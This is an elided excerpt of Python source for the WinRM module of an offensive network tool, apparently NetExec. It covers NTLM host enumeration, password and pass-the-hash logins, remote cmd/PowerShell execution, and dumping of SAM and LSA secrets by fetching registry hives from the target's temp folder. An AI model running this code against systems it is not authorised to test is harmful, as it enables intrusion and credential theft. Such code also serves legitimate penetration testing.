...
class winrm(connection):
    ...
    def enum_host_info(self):
        ntlm_info = parse_challenge(
            base64.b64decode(self.challenge_header.split(" ")[1].replace(",", ""))
        )
        ...
        self.db.add_host(
            self.host, self.port, self.hostname, self.targetDomain, self.server_os
        )
        ...
        self.output_filename = os.path.expanduser(
            f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(
                ":", "-"
            )
        )
    ...
    def create_conn_obj(self):
        ...
        for protocol in self.args.check_proto:
            ...
            endpoints[protocol]["port"] = (
                self.port[self.args.check_proto.index(protocol)]
                if len(self.port) == 2
                else self.port[0]
            )
        ...
        for protocol in endpoints:
            ...
            try:
                ...
                if (not self.challenge_header) or (
                    "Negotiate" not in self.challenge_header
                ):
                    self.logger.info(
                        'Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.'
                    )
                    return False
                ...
                if "Max retries exceeded with url" in str(e):
                    self.logger.info(
                        "Connection Timeout to WinRM service (max retries exceeded)"
                    )
                else:
    ...
    def check_if_admin(self):
        ...
        wsman.enumerate(
            "http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg
        )
        ...
        try:
            ...
            if self.admin_privs:
                ...
                self.db.add_admin_user(
                    "plaintext", domain, self.username, self.password, self.host
                )  # , user_id=user_id)
            ...
            if "with ntlm" in str(e):
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)}"
                )
            else:
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)} {e!s}"
                )
            return False
    ...
    def hash_login(self, domain, username, ntlm_hash):
        ...
        try:
            ...
            self.check_if_admin()
            self.logger.success(
                f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}"
            )
            ...
            if "with ntlm" in str(e):
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.nthash)}"
                )
            else:
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {e!s}"
                )
            return False
    ...
    def execute(self, payload=None, get_output=True, shell_type="cmd"):
        ...
        try:
            result = (
                self.conn.execute_cmd(payload, encoding=self.args.codec)
                if shell_type == "cmd"
                else self.conn.execute_ps(payload)
            )
        except Exception as e:
            # Reference: https://github.com/diyan/pywinrm/issues/275
            if hasattr(e, "code") and e.code == 5:
                self.logger.fail(
                    f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})"
                )

                if shell_type == "cmd":
                    self.logger.info(
                        "Cannot execute command via cmd, the user probably does not have invoke rights with Root WinRM listener - now switching to Powershell to attempt execution"
                    )
    ...
    def ps_execute(self):
        self.execute(
            payload=self.args.ps_execute, get_output=True, shell_type="powershell"
        )
    ...
    def sam(self):
        ...
        try:
            (
                self.conn.execute_cmd(dump_command)
                if self.args.dump_method == "cmd"
                else self.conn.execute_ps(f"cmd /c '{dump_command}'")
            )
            self.conn.fetch(
                f"C:\\windows\\temp\\{sam_storename}", self.output_filename + ".sam"
            )
            self.conn.fetch(
                f"C:\\windows\\temp\\{system_storename}",
                self.output_filename + ".system",
            )
            (
                self.conn.execute_cmd(clean_command)
                if self.args.dump_method == "cmd"
                else self.conn.execute_ps(f"cmd /c '{clean_command}'")
            )
        except Exception as e:
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail(
                    "Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user"
                )
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(
                    f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'"
                )
            else:
    ...
    def lsa(self):
        ...
        try:
            ...
            self.conn.fetch(
                f"C:\\windows\\temp\\{security_storename}",
                f"{self.output_filename}.security",
            )
            self.conn.fetch(
                f"C:\\windows\\temp\\{system_storename}",
                f"{self.output_filename}.system",
            )
            (
                self.conn.execute_cmd(clean_command)
                if self.args.dump_method == "cmd"
            ...
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail(
                    "Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user"
                )
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(
                    f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'"
                )
            else:
